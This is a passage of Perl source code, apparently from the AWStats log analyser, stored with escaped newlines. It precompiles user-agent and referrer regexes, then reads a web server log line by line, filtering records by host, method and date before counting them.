added\n\t}\n\tforeach my $key (@list) {\n\t\tpush @SearchEnginesSearchIDOrder, @{\"SearchEnginesSearchIDOrder_$key\"};\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"Add \"\n\t\t\t\t  . @{\"SearchEnginesSearchIDOrder_$key\"}\n\t\t\t\t  . \" elements from SearchEnginesSearchIDOrder_$key into SearchEnginesSearchIDOrder\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"SearchEnginesSearchIDOrder has now \"\n\t\t\t  . @SearchEnginesSearchIDOrder\n\t\t\t  . \" elements\",\n\t\t\t1\n\t\t);\n\t}\n\n\t# Complete HostAliases array\n\tmy $sitetoanalyze = quotemeta( lc($SiteDomain) );\n\tif ( !@HostAliases ) {\n\t\twarning(\n\"Warning: HostAliases parameter is not defined, $PROG choose \\\"$SiteDomain localhost 127.0.0.1\\\".\"\n\t\t);\n\t\tpush @HostAliases, qr/^$sitetoanalyze$/i;\n\t\tpush @HostAliases, qr/^localhost$/i;\n\t\tpush @HostAliases, qr/^127\\.0\\.0\\.1$/i;\n\t}\n\telse {\n\t\tunshift @HostAliases, qr/^$sitetoanalyze$/i;\n\t}    # Add SiteDomain as first value\n\n\t# Optimize arrays\n\t@HostAliases = &OptimizeArray( \\@HostAliases, 1 );\n\tif ($Debug) {\n\t\tdebug( \"HostAliases precompiled regex list is now @HostAliases\", 1 );\n\t}\n\t@SkipDNSLookupFor = &OptimizeArray( \\@SkipDNSLookupFor, 1 );\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"SkipDNSLookupFor precompiled regex list is now @SkipDNSLookupFor\",\n\t\t\t1\n\t\t);\n\t}\n\t@SkipHosts = &OptimizeArray( \\@SkipHosts, 1 );\n\tif ($Debug) {\n\t\tdebug( \"SkipHosts precompiled regex list is now @SkipHosts\", 1 );\n\t}\n\t@SkipReferrers = &OptimizeArray( \\@SkipReferrers, 1 );\n\tif ($Debug) {\n\t\tdebug( \"SkipReferrers precompiled regex list is now @SkipReferrers\",\n\t\t\t1 );\n\t}\n\t@SkipUserAgents = &OptimizeArray( \\@SkipUserAgents, 1 );\n\tif ($Debug) {\n\t\tdebug( \"SkipUserAgents precompiled regex list is now @SkipUserAgents\",\n\t\t\t1 );\n\t}\n\t@SkipFiles = &OptimizeArray( \\@SkipFiles, $URLNotCaseSensitive );\n\tif ($Debug) {\n\t\tdebug( \"SkipFiles precompiled regex list is now @SkipFiles\", 1 );\n\t}\n\t@OnlyHosts = &OptimizeArray( \\@OnlyHosts, 1 );\n\tif ($Debug) {\n\t\tdebug( \"OnlyHosts precompiled regex list is now @OnlyHosts\", 1 );\n\t}\n\t@OnlyUsers = &OptimizeArray( \\@OnlyUsers, 1 );\n\tif ($Debug) {\n\t\tdebug( \"OnlyUsers precompiled regex list is now @OnlyUsers\", 1 );\n\t}\n\t@OnlyUserAgents = &OptimizeArray( \\@OnlyUserAgents, 1 );\n\tif ($Debug) {\n\t\tdebug( \"OnlyUserAgents precompiled regex list is now @OnlyUserAgents\",\n\t\t\t1 );\n\t}\n\t@OnlyFiles = &OptimizeArray( \\@OnlyFiles, $URLNotCaseSensitive );\n\tif ($Debug) {\n\t\tdebug( \"OnlyFiles precompiled regex list is now @OnlyFiles\", 1 );\n\t}\n\t@NotPageFiles = &OptimizeArray( \\@NotPageFiles, $URLNotCaseSensitive );\n\tif ($Debug) {\n\t\tdebug( \"NotPageFiles precompiled regex list is now @NotPageFiles\", 1 );\n\t}\n\n\t# Precompile the regex search strings with qr\n\t@RobotsSearchIDOrder        = map { qr/$_/i } @RobotsSearchIDOrder;\n\t@WormsSearchIDOrder         = map { qr/$_/i } @WormsSearchIDOrder;\n\t@BrowsersSearchIDOrder      = map { qr/$_/i } @BrowsersSearchIDOrder;\n\t@OSSearchIDOrder            = map { qr/$_/i } @OSSearchIDOrder;\n\t@SearchEnginesSearchIDOrder = map { qr/$_/i } @SearchEnginesSearchIDOrder;\n\tmy $miscquoted     = quotemeta(\"$MiscTrackerUrl\");\n\tmy $defquoted      = quotemeta(\"/$DefaultFile[0]\");\n\tmy $sitewithoutwww = lc($SiteDomain);\n\t$sitewithoutwww =~ s/www\\.//;\n\t$sitewithoutwww = quotemeta($sitewithoutwww);\n\n\t# Define precompiled regex\n\tmy $regmisc        = qr/^$miscquoted/;\n\tmy $regfavico      = qr/\\/favicon\\.ico$/i;\n\tmy $regrobot       = qr/\\/robots\\.txt$/i;\n\tmy $regtruncanchor = qr/#(\\w*)$/;\n\tmy $regtruncurl    = qr/([$URLQuerySeparators])(.*)$/;\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tmy $regdefault;\n\tif ($URLNotCaseSensitive) { $regdefault = qr/$defquoted$/i; }\n\telse { $regdefault = qr/$defquoted$/; }\n\tmy $regipv4           = qr/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\n\tmy $regipv4l          = qr/^::ffff:\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\n\tmy $regipv6           = qr/^[0-9A-F]*:/i;\n\tmy $regveredge        = qr/edge\\/([\\d]+)/i;\n\tmy $regvermsie        = qr/msie([+_ ]|)([\\d\\.]*)/i;\n\t#my $regvermsie11      = qr/trident\\/7\\.\\d*\\;([+_ ]|)rv:([\\d\\.]*)/i;\n\tmy $regvermsie11      = qr/trident\\/7\\.\\d*\\;([a-zA-Z;+_ ]+|)rv:([\\d\\.]*)/i;\n\tmy $regvernetscape    = qr/netscape.?\\/([\\d\\.]*)/i;\n\tmy $regverfirefox     = qr/firefox\\/([\\d\\.]*)/i;\n\t# For Opera:\n\t# OPR/15.0.1266 means Opera 15 \n\t# Opera/9.80 ...... Version/12.16 means Opera 12.16\n\t# Mozilla/5.0 .... Opera 11.51 means Opera 11.51\n\tmy $regveropera = qr/opera\\/9\\.80\\s.+\\sversion\\/([\\d\\.]+)|ope?ra?[\\/\\s]([\\d\\.]+)/i;\n\tmy $regversafari      = qr/safari\\/([\\d\\.]*)/i;\n\tmy $regversafariver   = qr/version\\/([\\d\\.]*)/i;\n\tmy $regverchrome      = qr/chrome\\/([\\d\\.]*)/i;\n\tmy $regverkonqueror   = qr/konqueror\\/([\\d\\.]*)/i;\n\tmy $regversvn         = qr/svn\\/([\\d\\.]*)/i;\n\tmy $regvermozilla     = qr/mozilla(\\/|)([\\d\\.]*)/i;\n\tmy $regnotie          = qr/webtv|omniweb|opera/i;\n\tmy $regnotnetscape    = qr/gecko|compatible|opera|galeon|safari|charon/i;\n\tmy $regnotfirefox     = qr/flock/i;\n\tmy $regnotsafari      = qr/android|arora|chrome|shiira/i;\n\tmy $regreferer        = qr/^(\\w+):\\/\\/([^\\/:]+)(:\\d+|)/;\n\tmy $regreferernoquery = qr/^([^$URLQuerySeparators]+)/;\n\tmy $reglocal          = qr/^(www\\.|)$sitewithoutwww/i;\n\tmy $regget            = qr/get|out/i;\n\tmy $regsent           = qr/sent|put|in/i;\n\n\t# Define value of $pos_xxx, @fieldlib, $PerlParsingFormat\n\t&DefinePerlParsingFormat($LogFormat);\n\n\t# Load DNS Cache Files\n\t#------------------------------------------\n\tif ($DNSLookup) {\n\t\t&Read_DNS_Cache( \\%MyDNSTable, \"$DNSStaticCacheFile\", \"\", 1 )\n\t\t  ; # Load with save into a second plugin file if plugin enabled and second file not up to date. No use of FileSuffix\n\t\tif ( $DNSLookup == 1 ) {    # System DNS lookup required\n\t\t\t #if (! eval(\"use Socket;\")) { error(\"Failed to load perl module Socket.\"); }\n\t\t\t #use Socket;\n\t\t\t&Read_DNS_Cache( \\%TmpDNSLookup, \"$DNSLastUpdateCacheFile\",\n\t\t\t\t\"$FileSuffix\", 0 )\n\t\t\t  ;    # Load with no save into a second plugin file. Use FileSuffix\n\t\t}\n\t}\n\n\t# Processing log\n\t#------------------------------------------\n\n\tif ($EnableLockForUpdate) {\n\n\t\t# Trap signals to remove lock\n\t\t$SIG{INT} = \\&SigHandler;    # 2\n\t\t                             #$SIG{KILL} = \\&SigHandler;\t# 9\n\t\t                             #$SIG{TERM} = \\&SigHandler;\t# 15\n\t\t                             # Set AWStats update lock\n\t\t&Lock_Update(1);\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\"Start Update process (lastprocesseddate=$lastprocesseddate)\");\n\t}\n\n\t# Open log file\n\tif ($Debug) { debug(\"Open log file \\\"$LogFile\\\"\"); }\n\topen( LOG, \"$LogFile\" )\n\t  || error(\"Couldn't open server log file \\\"$LogFile\\\" : $!\");\n\tbinmode LOG\n\t  ;   # Avoid premature EOF due to log files corrupted with \\cZ or bin chars\n\n\t# Define local variables for loop scan\n\tmy @field               = ();\n\tmy $counterforflushtest = 0;\n\tmy $qualifdrop          = '';\n\tmy $countedtraffic      = 0;\n\n\t# Reset chrono for benchmark (first call to GetDelaySinceStart)\n\t&GetDelaySinceStart(1);\n\tif ( !scalar keys %HTMLOutput ) {\n\t\tprint \"Phase 1 : First bypass old records, searching new record...\\n\";\n\t}\n\n\t# Can we try a direct seek access in log ?\n\tmy $line;\n\tif ( $LastLine && $LastLineNumber && $LastLineOffset && $LastLineChecksum )\n\t{\n\n\t\t# Try a direct seek access to save time\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"Try a direct access to LastLine=$LastLine, LastLineNumber=$LastLineNumber, LastLineOffset=$LastLineOffset, LastLineChecksum=$LastLineChecksum\"\n\t\t\t);\n\t\t}\n\t\tseek( LOG, $LastLineOffset, 0 );\n\t\tif ( $line = <LOG> ) {\n\t\t\tchomp $line;\n\t\t\t$line =~ s/\\r$//;\n\t\t\t@field = map( /$PerlParsingFormat/, $line );\n\t\t\tif ($Debug) {\n\t\t\t\tmy $string = '';\n\t\t\t\tforeach ( 0 .. @field - 1 ) {\n\t\t\t\t\t$string .= \"$fieldlib[$_]=$field[$_] \";\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug( \" Read line after direct access: $string\", 1 );\n\t\t\t\t}\n\t\t\t}\n\t\t\tmy $checksum = &CheckSum($line);\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" LastLineChecksum=$LastLineChecksum, Read line checksum=$checksum\",\n\t\t\t\t\t1\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $checksum == $LastLineChecksum ) {\n\t\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\t\tprint\n\"Direct access after last parsed record (after line $LastLineNumber)\\n\";\n\t\t\t\t}\n\t\t\t\t$lastlinenb         = $LastLineNumber;\n\t\t\t\t$lastlineoffset     = $LastLineOffset;\n\t\t\t\t$lastlineoffsetnext = tell LOG;\n\t\t\t\t$NewLinePhase       = 1;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\t\tprint\n\"Direct access to last remembered record has fallen on another record.\\nSo searching new records from beginning of log file...\\n\";\n\t\t\t\t}\n\t\t\t\t$lastlinenb         = 0;\n\t\t\t\t$lastlineoffset     = 0;\n\t\t\t\t$lastlineoffsetnext = 0;\n\t\t\t\tseek( LOG, 0, 0 );\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\tprint\n\"Direct access to last remembered record is out of file.\\nSo searching it from beginning of log file...\\n\";\n\t\t\t}\n\t\t\t$lastlinenb         = 0;\n\t\t\t$lastlineoffset     = 0;\n\t\t\t$lastlineoffsetnext = 0;\n\t\t\tseek( LOG, 0, 0 );\n\t\t}\n\t}\n\telse {\n\n\t\t# No try of direct seek access\n\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\tprint \"Searching new records from beginning of log file...\\n\";\n\t\t}\n\t\t$lastlinenb         = 0;\n\t\t$lastlineoffset     = 0;\n\t\t$lastlineoffsetnext = 0;\n\t}\n\n\t#\n\t# Loop on each log line\n\t#\n\twhile ( $line = <LOG> ) {\n\t\t\n\t\t# 20080525 BEGIN Patch to test if first char of $line = hex \"00\" then conclude corrupted with binary code\n\t\tmy $FirstHexChar;\n\t\t$FirstHexChar = sprintf( \"%02X\", ord( substr( $line, 0, 1 ) ) );\n\t\tif ( $FirstHexChar eq '00' ) {\n\t\t\t$NbOfLinesCorrupted++;\n\t\t\tif ($ShowCorrupted) {\n\t\t\t\tprint \"Corrupted record line \"\n\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t  . \" (record starts with hex 00; binary code): $line\\n\";\n\t\t\t}\n\t\t\tif (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog\n\t\t\t\t&& $NbOfLinesParsed == $NbOfLinesCorrupted )\n\t\t\t{\n\t\t\t\terror( \"Format error\", $line, $LogFile );\n\t\t\t}    # Exit with format error\n\t\t\tnext;\n\t\t}\n\t\t# 20080525 END\n\n\t\tchomp $line;\n\t\t$line =~ s/\\r$//;\n\t\tif ( $UpdateFor && $NbOfLinesParsed >= $UpdateFor ) { last; }\n\t\t$NbOfLinesParsed++;\n\n\t\t$lastlineoffset     = $lastlineoffsetnext;\n\t\t$lastlineoffsetnext = tell LOG;\n\n\t\tif ($ShowSteps) {\n\t\t\tif ( ( ++$NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) == 0 ) {\n\t\t\t\tmy $delay = &GetDelaySinceStart(0);\n\t\t\t\tprint \"$NbOfLinesParsed lines processed (\"\n\t\t\t\t  . ( $delay > 0 ? $delay : 1000 ) . \" ms, \"\n\t\t\t\t  . int(\n\t\t\t\t\t1000 * $NbOfLinesShowsteps / ( $delay > 0 ? $delay : 1000 )\n\t\t\t\t  )\n\t\t\t\t  . \" lines/second)\\n\";\n\t\t\t}\n\t\t}\n\n\t\tif ( $LogFormat eq '2' && $line =~ /^#Fields:/ ) {\n\t\t\tmy @fixField = map( /^#Fields: (.*)/, $line );\n\t\t\tif ( $fixField[0] !~ /s-kernel-time/ ) {\n\t\t\t\tdebug( \"Found new log format: '\" . $fixField[0] . \"'\", 1 );\n\t\t\t\t&DefinePerlParsingFormat( $fixField[0] );\n\t\t\t}\n\t\t}\n\n\t\t# Parse line record to get all required fields\n\t\tif ( !( @field = map( /$PerlParsingFormat/, $line ) ) ) {\n\t\t\t# see if the line is a comment, blank or corrupted\n \t\t\tif ( $line =~ /^#/ || $line =~ /^!/ ) {\n\t\t\t\t$NbOfLinesComment++;\n\t\t\t\tif ($ShowCorrupted){\n\t\t\t\t\tprint \"Comment record line \"\n\t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t\t  . \": $line\\n\";\n\t\t\t\t}\n \t\t\t}\n \t\t\telsif ( $line =~ /^\\s*$/ ) {\n \t\t\t\t$NbOfLinesBlank++;\n\t\t\t\tif ($ShowCorrupted){\n\t\t\t\t\tprint \"Blank record line \"\n\t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t\t  . \"\\n\";\n\t\t\t\t}\n \t\t\t}else{\n \t\t\t\t$NbOfLinesCorrupted++;\n \t\t\t\tif ($ShowCorrupted){\n \t\t\t\tprint \"Corrupted record line \"\n  \t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n  \t\t\t\t\t  . \" (record format does not match LogFormat parameter): $line\\n\";\n  \t\t\t\t}\n\t\t\t}\n\t\t\tif (   $NbOfLinesParsed >= $NbOfLinesForCorruptedLog\n\t\t\t\t&& $NbOfLinesParsed == ($NbOfLinesCorrupted + $NbOfLinesComment + $NbOfLinesBlank))\n\t\t\t{\n\t\t\t\terror( \"Format error\", $line, $LogFile );\n\t\t\t}    # Exit with format error\n\t\t\tif ( $line =~ /^__end_of_file__/i ) { last; } # For test purpose only\n\t\t\tnext;\n\t\t}\n\n\t\tif ($Debug) {\n\t\t\tmy $string = '';\n\t\t\tforeach ( 0 .. @field - 1 ) {\n\t\t\t\t$string .= \"$fieldlib[$_]=$field[$_] \";\n\t\t\t}\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\t\t\t\t\t\" Correct format line \"\n\t\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t\t  . \": $string\",\n\t\t\t\t\t4\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\n\t\t# Drop wrong virtual host name\n\t\t#----------------------------------------------------------------------\n\t\tif ( $pos_vh >= 0 && $field[$pos_vh] !~ /^$SiteDomain$/i ) {\n\t\t\tmy $skip = 1;\n\t\t\tforeach (@HostAliases) {\n\t\t\t\tif ( $field[$pos_vh] =~ /$_/ ) { $skip = 0; last; }\n\t\t\t}\n\t\t\tif ($skip) {\n\t\t\t\t$NbOfLinesDropped++;\n\t\t\t\tif ($ShowDropped) {\n\t\t\t\t\tprint\n\"Dropped record (virtual hostname '$field[$pos_vh]' does not match SiteDomain='$SiteDomain' nor HostAliases parameters): $line\\n\";\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t}\n\n\t\t# Drop wrong method/protocol\n\t\t#---------------------------\n\t\tif ( $LogType ne 'M' ) { $field[$pos_url] =~ s/\\s/%20/g; }\n\t\tif (\n\t\t\t$LogType eq 'W'\n\t\t\t&& (\n\t\t\t\t   $field[$pos_method] eq 'GET'\n\t\t\t\t|| $field[$pos_method] eq 'POST'\n\t\t\t\t|| $field[$pos_method] eq 'HEAD'\n\t\t\t\t|| $field[$pos_method] eq 'PROPFIND'\n\t\t\t\t|| $field[$pos_method] eq 'CHECKOUT'\n\t\t\t\t|| $field[$pos_method] eq 'LOCK'\n\t\t\t\t|| $field[$pos_method] eq 'PROPPATCH'\n\t\t\t\t|| $field[$pos_method] eq 'OPTIONS'\n\t\t\t\t|| $field[$pos_method] eq 'MKACTIVITY'\n\t\t\t\t|| $field[$pos_method] eq 'PUT'\n\t\t\t\t|| $field[$pos_method] eq 'MERGE'\n\t\t\t\t|| $field[$pos_method] eq 'DELETE'\n\t\t\t\t|| $field[$pos_method] eq 'REPORT'\n\t\t\t\t|| $field[$pos_method] eq 'MKCOL'\n\t\t\t\t|| $field[$pos_method] eq 'COPY'\n\t\t\t\t|| $field[$pos_method] eq 'RPC_IN_DATA'\n\t\t\t\t|| $field[$pos_method] eq 'RPC_OUT_DATA'\n\t\t\t\t|| $field[$pos_method] eq 'OK'             # Webstar\n\t\t\t\t|| $field[$pos_method] eq 'ERR!'           # Webstar\n\t\t\t\t|| $field[$pos_method] eq 'PRIV'           # Webstar\n\t\t\t)\n\t\t  )\n\t\t{\n\n# HTTP request.\tKeep only GET, POST, HEAD, *OK* and ERR! for Webstar. Do not keep OPTIONS, TRACE\n\t\t}\n\t\telsif (\n\t\t\t( $LogType eq 'W' || $LogType eq 'S' )\n\t\t\t&& (   uc($field[$pos_method]) eq 'GET'\n\t\t\t\t|| uc($field[$pos_method]) eq 'MMS'\n\t\t\t\t|| uc($field[$pos_method]) eq 'RTSP'\n\t\t\t\t|| uc($field[$pos_method]) eq 'HTTP'\n\t\t\t\t|| uc($field[$pos_method]) eq 'RTP' )\n\t\t  )\n\t\t{\n\n# Streaming request (windows media server, realmedia or darwin streaming server)\n\t\t}\n\t\telsif ( $LogType eq 'M' && $field[$pos_method] eq 'SMTP' ) {\n\n\t\t# Mail request ('SMTP' for mail log with maillogconvert.pl preprocessor)\n\t\t}\n\t\telsif (\n\t\t\t$LogType eq 'F'\n\t\t\t&& (   $field[$pos_method] eq 'RETR'\n\t\t\t\t|| $field[$pos_method] eq 'D'\n\t\t\t\t|| $field[$pos_method] eq 'o'\n\t\t\t\t|| $field[$pos_method] =~ /$regget/o )\n\t\t  )\n\t\t{\n\n\t\t\t# FTP GET request\n\t\t}\n\t\telsif (\n\t\t\t$LogType eq 'F'\n\t\t\t&& (   $field[$pos_method] eq 'STOR'\n\t\t\t\t|| $field[$pos_method] eq 'U'\n\t\t\t\t|| $field[$pos_method] eq 'i'\n\t\t\t\t|| $field[$pos_method] =~ /$regsent/o )\n\t\t  )\n\t\t{\n\n\t\t\t# FTP SENT request\n\t\t}\n\t\telsif($line =~ m/#Fields:/){\n \t\t\t# log #fields as comment\n \t\t\t$NbOfLinesComment++;\n \t\t\tnext;\t\t\t\n \t\t}else{\n\t\t\t$NbOfLinesDropped++;\n\t\t\tif ($ShowDropped) {\n\t\t\t\tprint\n\"Dropped record (method/protocol '$field[$pos_method]' not qualified when LogType=$LogType): $line\\n\";\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n\t\t$field[$pos_date] =~\n\t\t  tr/,-\\/ \\tT/::::::/s;  # \" \\t\" is used instead of \"\\s\" not known with tr\n\t\tmy @dateparts =\n\t\t  split( /:/, $field[$pos_date] ); # tr and split faster than @dateparts=split(/[\\/\\-:\\s]/,$field[$pos_date])\n\t\t # Detected date format: \n\t\t # dddddddddd, YYYY-MM-DD HH:MM:SS (IIS), MM/DD/YY\\tHH:MM:SS,\n\t\t # DD/Month/YYYY:HH:MM:SS (Apache), DD/MM/YYYY HH:MM:SS, Mon DD HH:MM:SS,\n\t\t # YYYY-MM-DDTHH:MM:SS (iso)\n\t\tif ( !$dateparts[1] ) {    # Unix timestamp\n\t\t\t(\n\t\t\t\t$dateparts[5], $dateparts[4], $dateparts[3],\n\t\t\t\t$dateparts[0], $dateparts[1], $dateparts[2]\n\t\t\t  )\n\t\t\t  = localtime( int( $field[$pos_date] ) );\n\t\t\t$dateparts[1]++;\n\t\t\t$dateparts[2] += 1900;\n\t\t}\n\t\telsif ( $dateparts[0] =~ /^....$/ ) {\n\t\t\tmy $tmp = $dateparts[0];\n\t\t\t$dateparts[0] = $dateparts[2];\n\t\t\t$dateparts[2] = $tmp;\n\t\t}\n\t\telsif ( $field[$pos_date] =~ /^..:..:..:/ ) {\n\t\t\t$dateparts[2] += 2000;\n\t\t\tmy $tmp = $dateparts[0];\n\t\t\t$dateparts[0] = $dateparts[1];\n\t\t\t$dateparts[1] = $tmp;\n\t\t}\n\t\telsif ( $dateparts[0] =~ /^...$/ ) {\n\t\t\tmy $tmp = $dateparts[0];\n\t\t\t$dateparts[0] = $dateparts[1];\n\t\t\t$dateparts[1] = $tmp;\n\t\t\t$tmp          = $dateparts[5];\n\t\t\t$dateparts[5] = $dateparts[4];\n\t\t\t$dateparts[4] = $dateparts[3];\n\t\t\t$dateparts[3] = $dateparts[2];\n\t\t\t$dateparts[2] = $tmp || $nowyear;\n\t\t}\n\t\tif ( exists( $MonthNum{ $dateparts[1] } ) ) {\n\t\t\t$dateparts[1] = $MonthNum{ $dateparts[1] };\n\t\t}    # Change lib month in num month if necessary\n\t\tif ( $dateparts[1] <= 0 )\n\t\t{ # Date corrupted (for example $dateparts[1]='dic' for december month in a spanish log file)\n\t\t\t$NbOfLinesCorrupted++;\n\t\t\tif ($ShowCorrupted) {\n\t\t\t\tprint \"Corrupted record line \"\n\t\t\t\t  . ( $lastlinenb + $NbOfLinesParsed )\n\t\t\t\t  . \" (bad date format for month, may be month are not in english ?): $line\\n\";\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\n# Now @dateparts is (DD,MM,YYYY,HH,MM,SS) and we're going to create $timerecord=YYYYMMDDHHMMSS\n\t\tif ( $PluginsLoaded{'ChangeTime'}{'timezone'} ) {\n\t\t\t@dateparts = ChangeTime_timezone( \\@dateparts );\n\t\t}\n\t\tmy $yearrecord  = int( $dateparts[2] );\n\t\tmy $monthrecord = int( $dateparts[1] );\n\t\tmy $dayrecord   = int( $dateparts[0] );\n\t\tmy $hourrecord  = int( $dateparts[3] );\n\t\tmy $daterecord  = '';\n\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\t$daterecord = sprintf( \"%04i%02i\", $yearrecord, $monthrecord );\n\t\t}\n\t\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t\t$daterecord = sprintf( \"%04i%\", $yearrecord );\n\t\t}\n\t\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t\t$daterecord =\n\t\t\t  sprintf( \"%04i%02i%02i\", $yearrecord, $monthrecord, $dayrecord );\n\t\t}\n\t\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t\t$daterecord = sprintf( \"%04i%02i%02i%02i\",\n\t\t\t\t$yearrecord, $monthrecord, $dayrecord, $hourrecord );\n\t\t}\n\n\t\t# TODO essayer de virer yearmonthrecord\n\t\tmy $yearmonthdayrecord =\n\t\t  sprintf( \"$dateparts[2]%02i%02i\", $dateparts[1], $dateparts[0] );\n\t\tmy $timerecord =\n\t\t  ( ( int(\"$yearmonthdayrecord\") * 100 + $dateparts[3] ) * 100 +\n\t\t\t  $dateparts[4] ) * 100 + $dateparts[5];\n\n\t\t# Check date\n\t\t#-----------------------\n\t\tif ( $LogType eq 'M' && $timerecord > $tomorrowtime ) {\n\n# Postfix/Sendmail does not store year, so we assume that year is year-1 if record is in future\n\t\t\t$yearrecord--;\n\t\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%02i\", $yearrecord, $monthrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%\", $yearrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord );\n\t\t\t}\n\t\t\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t\t\t$daterecord = sprintf( \"%04i%02i%02i%02i\",\n\t\t\t\t\t$yearrecord, $monthrecord, $dayrecord, $hourrecord );\n\t\t\t}\n\n\t\t\t# TODO essayer de virer yearmonthrecord\n\t\t\t$yearmonthdayrecord =\n\t\t\t  sprintf( \"$yearrecord%02i%02i\", $dateparts[1], $dateparts[0] );\n\t\t\t$timerecord =\n\t\t\t  ( ( int(\"$yearmonthdayrecord\") * 100 + $dateparts[3] ) * 100 +\n\t\t\t\t  $dateparts[4] ) * 100 + $dateparts[5];\n\t\t}\n\t\tif ( $timerecord < 10000000000000 || $timerecord > $tomorrowtime ) {\n\t\t\t$NbOfLinesCorrupted++;\n\t\t\tif ($ShowCorrupted) {\n\t\t\t\tprint\n\"Corrupted record (invalid date, timerecord=$timerecord): $line\\n\";\n\t\t\t}\n\t\t\tnext;   # Should not happen, kept in case of parasite/corrupted line\n\t\t}\n\t\tif ($NewLinePhase) {\n\n\t\t\t# TODO NOTSORTEDRECORDTOLERANCE does not work around midnight\n\t\t\tif ( $timerecord < ( $LastLine - $NOTSORTEDRECORDTOLERANCE ) ) {\n\n\t\t\t\t# Should not happen, kept in case of parasite/corrupted old line\n\t\t\t\t$NbOfLinesCorrupted++;\n\t\t\t\tif ($ShowCorrupted) {\n\t\t\t\t\tprint\n\"Corrupted record (date $timerecord lower than $LastLine-$NOTSORTEDRECORDTOLERANCE): $line\\n\";\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tif ( $timerecord <= $LastLine ) {    # Already processed\n\t\t\t\t$NbOfOldLines++;\n\t\t\t\tnext;\n\t\t\t}\n\n# We found a new line. This will replace comparison \"<=\" with \"<\" between timerecord and LastLine (we should have only new lines now)\n\t\t\t$NewLinePhase = 1;    # We will never enter here again\n\t\t\tif ($ShowSteps) {\n\t\t\t\tif ( $NbOfLinesShowsteps > 1\n\t\t\t\t\t&& ( $NbOfLinesShowsteps & $NBOFLINESFORBENCHMARK ) )\n\t\t\t\t{\n\t\t\t\t\tmy $delay = &GetDelaySinceStart(0);\n\t\t\t\t\tprint \"\"\n\t\t\t\t\t  . ( $NbOfLinesParsed - 1 )\n\t\t\t\t\t  . \" lines processed (\"\n\t\t\t\t\t  . ( $delay > 0 ? $delay : 1000 ) . \" ms, \"\n\t\t\t\t\t  . int( 1000 * ( $NbOfLinesShowsteps - 1 ) /\n\t\t\t\t\t\t  ( $delay > 0 ? $delay : 1000 ) )\n\t\t\t\t\t  . \" lines/second)\\n\";\n\t\t\t\t}\n\t\t\t\t&GetDelaySinceStart(1);\n\t\t\t\t$NbOfLinesShowsteps = 1;\n\t\t\t}\n\t\t\tif ( !scalar keys %HTMLOutput ) {\n\t\t\t\tprint\n\"Phase 2 : Now process new records (Flush history on disk after \"\n\t\t\t\t  . ( $LIMITFLUSH << 2 )\n\t\t\t\t  . \" hosts)...\\n\";\n\n#print \"Phase 2 : Now process new records (Flush history on disk after \".($LIMITFLUSH<<2).\" hosts or \".($LIMITFLUSH).\" URLs)...\\n\";\n\t\t\t}\n\t\t}\n\n\t\t# Convert URL for Webstar to common URL\n\t\tif ( $LogFormat eq '3' ) {\n\t\t\t$field[$pos_url] =~ s/:/\\//g;\n\t\t\tif ( $field[$pos_code] eq '-' ) { $field[$pos_code] = '200'; }\n\t\t}\n\n# Here, field array, timerecord and yearmonthdayrecord are initialized for log record\n\t\tif ($Debug) {\n\t\t\tdebug( \"  This is a not already processed record ($timerecord)\",\n\t\t\t\t4 );\n\t\t}\n\n\t\t# Check if there's a CloudFlare Visitor IP in the query string\n\t\t# If it does, replace the ip\n\t\tif ( $pos_query >= 0 && $field[$pos_query] && $field[$pos_query] =~ /\\[CloudFlare_Visitor_IP[:](\\d+[.]\\d+[.]\\d+[.]\\d+)\\]/ ) {\n\t\t\t$field[$pos_host] = \"$1\";\n\t\t}\t\n\n\t\t# We found a new line\n\t\t#----------------------------------------\n\t\tif ( $timerecord > $LastLine ) {\n\t\t\t$LastLine = $timerecord;\n\t\t}    # Test should always be true except with not sorted log files\n\n\t\t# Skip for some client host IP addresses, some URLs, other URLs\n\t\tif (\n\t\t\t@SkipHosts\n\t\t\t&& ( &SkipHost( $field[$pos_host] )\n\t\t\t\t|| ( $pos_hostr && 